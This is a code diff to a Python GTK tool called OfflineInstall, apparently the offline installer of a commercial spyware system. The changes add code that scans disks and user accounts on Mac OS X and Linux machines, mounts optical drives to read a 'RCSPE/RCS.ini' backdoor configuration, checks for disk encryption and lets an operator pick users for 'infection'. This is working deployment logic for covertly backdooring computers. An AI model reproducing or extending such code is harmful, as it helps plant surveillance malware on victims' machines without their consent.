@@ -6,6 +6,7 @@ import subprocess
 import sys
 import signal
 import os
+import time
 import json
 
 class OfflineInstall(object):
@@ -16,10 +17,26 @@ class OfflineInstall(object):
 	treeview = None
 	selection = None
 	icon = None
-	status = False
+
+	#
+	# General configurations
+	##
+	backconf = None
+
+	#
+	# OS X
+	##
+	staosx = False
+	licosx = True
 	exsosx = False
 	tabosx = None
 	useosx = None
+
+	#
+	# Linux
+	##
+	stalin = False
+	liclin = True
 	exslin = False
 	crylin = False
 	tablin = None
@@ -54,10 +71,6 @@ class OfflineInstall(object):
 
 		self.icon = Gtk.IconTheme.get_default()
 
-		#
-		# TODO: Verificare se dentro il lettore CD/DVD ci sia la directory rcspa
-		##
-
 		self.start()
 
 	#
@@ -65,6 +78,14 @@ class OfflineInstall(object):
 	##
 	def start(self):
 		self.load_modules()
+		[self.staosx, self.stalin] = self.check_osconfigs()
+
+		self.treeview.show()
+		self.scroll.show()
+		self.window.show()
+
+		self.check_configfiles()
+		self.check_infectusers()
 		self.load_systems()
 
 	#
@@ -134,7 +155,7 @@ class OfflineInstall(object):
 							ret = subprocess.call("cryptsetup isLuks /dev/{}".format(j), shell=True)
 							if int(ret) == 0:
 								self.crylin = True
-								print("  Found: /dev/" + j + ' (Encrypted)')
+								print("  Found: /dev/" + j + ' (Disk is encrypted)')
 							else:
 								print("  Found: /dev/" + j) 
 						except:
@@ -352,23 +373,6 @@ class OfflineInstall(object):
 		return True
 
 	#
-	# Check the infect status of OS X user
-	##
-	def check_osx_infected_user(self, user, home):
-		print("      Check if " + user + " OS X user with " + home + " home is infected...")
-
-		# 
-		# TODO:
-		# Verifica se l'utente non e' infettato, l'infezione e' corrotta oppure e' gia' infettato
-		#
-		# None -> Not infected
-		# False -> Corrupted infected
-		# True -> Infected
-		##
-
-		return True
-
-	#
 	# Search OS X system users
 	##
 	def check_osx_users(self):
@@ -382,8 +386,7 @@ class OfflineInstall(object):
 			if i[0] == '.' or i == "shared" or i == "Shared":
 				continue
 
-			status = self.check_osx_infected_user(i, '/Users/' + i)
-			self.useosx.append({'username': i, 'home': '/Users/' + i, 'fullname': "", 'status': status})
+			self.useosx.append({'username': i, 'home': '/Users/' + i, 'fullname': "", 'status': None})
 
 		if self.useosx == []:
 			self.useosx = None
@@ -478,23 +481,6 @@ class OfflineInstall(object):
 		return True
 
 	#
-	# Check the infect status of Linux user
-	##
-	def check_linux_infected_user(self, user, home):
-		print("      Check if " + user + " Linux user with " + home + " home is infected...")
-
-		#
-		# TODO:
-		# Verifica se l'utente non e' infettato, l'infezione e' corrotta oppure e' gia' infettato
-		#
-		# None -> Not infected
-		# False -> Corrupted infected
-		# True -> Infected
-		##
-
-		return True
-
-	#
 	# Search Linux OS system users
 	##
 	def check_linux_users(self):
@@ -513,8 +499,7 @@ class OfflineInstall(object):
 
 			for u in user:
 				if u == line[0]:
-					status = self.check_linux_infected_user(line[0], line[5])
-					self.uselin.append({'username': line[0], 'home': "/home/" + line[0], 'fullname': line[4].replace(",", ""), 'status': status})
+					self.uselin.append({'username': line[0], 'home': "/home/" + line[0], 'fullname': line[4].replace(",", ""), 'status': None})
 
 		if self.uselin == []:
 			self.uselin = None
@@ -629,28 +614,30 @@ class OfflineInstall(object):
 	##
 	def print_osreports(self):
 		print("")
-		print("Reports:")
+		print("OS Reports:")
 		print("")
 
+		print("Mac OS X:")
+
 		if self.tabosx == None:
-			print("Mac OS X:")
 			print("{")
 			print("  None")
 			print("}")
 		else:
-			print("Mac OS X:")
 			print(json.dumps(self.tabosx, indent = 1, sort_keys = True))
 			print(json.dumps(self.useosx, indent = 1, sort_keys = True))
 
+		print("Linux:")
+
 		if self.tablin == None:
-			print("Linux:")
 			print("{")
 			print("  None")
 			print("}")
 		else:
-			print("Linux:")
 			print(json.dumps(self.tablin, indent = 1, sort_keys = True))
 			print(json.dumps(self.uselin, indent = 1, sort_keys = True))
+
+		print("")
 
 	#
 	# Search OS configurations of each OS system
@@ -673,27 +660,142 @@ class OfflineInstall(object):
 			print("  Not found: Hd OS systems configuration")
 			return False
 		else:
+			print("  Found: Hd OS systems configuration")
 			self.print_osreports()
 
-		return True
+		if self.tabosx != None and self.tablin != None:
+			return [True, True]
+		elif self.tabosx == None and self.tablin != None:
+			return [False, True]
+		elif self.tabosx != None and self.tablin == None:
+			return [True, False]
+
+		return [False, False]
+
+	#
+	# Show all backdoors configurations
+	##
+	def print_configreports(self):
+		print("")
+		print("Configuration Reports:")
+		print("")
+
+		print("Backdoor:")
+
+		if self.backconf == None:
+			print("{")
+			print("  None")
+			print("}")
+		else:
+			print(json.dumps(self.backconf, indent = 1, sort_keys = True))
+
+		print("")
+
+	#
+	# Check backdoors configurations files
+	##
+	def check_configfiles(self):
+		devs = os.listdir('/dev/')
+
+		print("Searching configuration files in the devices...")
+
+		try:
+			ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
+		except:
+			pass
+
+		for i in devs:
+			if i.find("sr") != -1:
+				if len(i) == 3:
+					print("  Found: /dev/" + i)
+
+					try:
+						ret = subprocess.check_output("mount /dev/{} /mnt/ 2> /dev/null".format(i), shell=True)
+					except:
+						continue
+
+					if os.path.exists("/mnt/RCSPE/") == True and os.path.exists("/mnt/RCSPE/RCS.ini") == True and \
+					   os.stat("/mnt/RCSPE/RCS.ini").st_size != 0 and os.path.exists("/mnt/RCSPE/files/") == True:
+						self.backconf = {} 
+
+						if os.path.exists("/mnt/RCSPE/files/OSX/") == False:
+							self.staosx = False
+							self.licosx = False
+
+							print("  Not found: OS X license")
+						else:
+							print("  Found: OS X license")
+
+						if os.path.exists("/mnt/RCSPE/files/LINUX/") == False:
+							self.stalin = False
+							self.liclin = False
+
+							print("  Not found: Linux license")
+						else:
+							print("  Found: Linux license")
+
+						self.backconf.update({'dev': '/dev/' + i})
+
+						for line in open("/mnt/RCSPE/RCS.ini").readlines():
+							if line.find("[RCS]") != -1:
+								continue
+
+							line = line.replace("\n", "").split("=")
+							self.backconf.update({line[0].lower(): line[1]})
+
+						keys = ['version', 'hdir', 'hreg', 'hcore', 'hdrv', 'driver64', 'hsys', 'hkey', 'huid', 'func']
+
+						for i in keys:
+							if (i in self.backconf) == False:
+								print("  Not found: " + i + " in configuration file") 
+								self.backconf = None 
+								break
+
+						if self.backconf != None:
+							if ('holddir' in self.backconf) == True:
+								self.backconf.update({'holddir': self.backconf['hdir']})
+
+							if ('holdreg' in self.backconf) == True:
+								self.backconf.update({'holdreg': self.backconf['hreg']})
+
+						try:
+							ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
+						except:
+							pass
+						break
+
+					try:
+						ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
+					except:
+						pass
+
+		if self.backconf == None:
+			print("  Not found: configuration files")
+
+			dialog = self.builder.get_object("messagedialog2")
+			response = dialog.run()
+			if response == Gtk.ResponseType.OK:
+				dialog.hide()
+				time.sleep(1)
+				self.check_configfiles()
+			else:
+				dialog.hide()
+				self.halt()
+		else:
+			print("  Found: configuration files in the /dev/" + i)
+			self.print_configreports()
 
 	#
 	# Load all OS systems confiuration and users
 	##
 	def load_systems(self):
-		self.status = self.check_osconfigs()
-
-		self.treeview.show()
-		self.scroll.show()
-		self.window.show()
-
 		self.builder.get_object("comboboxtext1").remove_all()
 		self.builder.get_object("liststore1").clear()
 		self.builder.get_object("comboboxtext1").set_sensitive(False)
 		self.builder.get_object("treeview1").set_sensitive(False)
 		self.builder.get_object("buttonbox3").set_sensitive(False)
 
-		if self.status == False and self.exsosx == False and self.exslin == False:
+		if self.staosx == False and self.stalin == False and self.exsosx == False and self.exslin == False:
 			dialog = self.builder.get_object("messagedialog1")
 			response = dialog.run()
 			if response == Gtk.ResponseType.CLOSE:
@@ -716,13 +818,22 @@ class OfflineInstall(object):
 		self.builder.get_object("comboboxtext1").set_active(0)
 
 	#
+	# Check if the users of OS are infected
+	##
+	def check_infectusers(self):
+		#
+		# TODO: Verifica se gli utenti degli OS sono gia' infettati
+		##
+		print("Check users infected...")
+
+	#
 	# User selects the correct OS for infection
 	##
 	def select_os(self, *args):
 		if self.builder.get_object("comboboxtext1").get_active_text() == "Mac OS X":
 			self.builder.get_object("liststore1").clear()
 
-			if self.status == True and self.exsosx == True:
+			if self.staosx == True and self.exsosx == True:
 				self.builder.get_object("image1").set_from_file(self.tabosx['imgon'])
 				self.builder.get_object("label3").set_label("Computer Name: " + self.tabosx['osname'])
 
@@ -744,14 +855,18 @@ class OfflineInstall(object):
 			else:
 				self.builder.get_object("image1").set_from_file('/opt/offline-install/imagine/macos-off.bmp')	
 				self.builder.get_object("label3").set_label("Computer Name: Unknown")
-				self.builder.get_object("label4").set_label("OS Version: Mac OS X")
+
+				if self.licosx == False:
+					self.builder.get_object("label4").set_label("OS Version: Mac OS X (Platform not available)")
+				else:
+					self.builder.get_object("label4").set_label("OS Version: Mac OS X")
 
 				self.builder.get_object("treeview1").set_sensitive(False)
 				self.builder.get_object("buttonbox3").set_sensitive(False)
 		elif self.builder.get_object("comboboxtext1").get_active_text() == "Linux":
 			self.builder.get_object("liststore1").clear()
 
-			if self.status == True and self.exslin == True:
+			if self.stalin == True and self.exslin == True:
 				self.builder.get_object("image1").set_from_file(self.tablin['imgon'])
 				self.builder.get_object("label3").set_label("Computer Name: " + self.tablin['osname'])
 
@@ -783,7 +898,9 @@ class OfflineInstall(object):
 				self.builder.get_object("label3").set_label("Computer Name: Unknown")
 
 				if self.crylin == True:
-					self.builder.get_object("label4").set_label("OS Version: Linux (Encrypted)")
+					self.builder.get_object("label4").set_label("OS Version: Linux (Disk is encrypted)")
+				elif self.liclin == False:
+					self.builder.get_object("label4").set_label("OS Version: Linux (Platform not available)")
 				else:
 					self.builder.get_object("label4").set_label("OS Version: Linux")
 
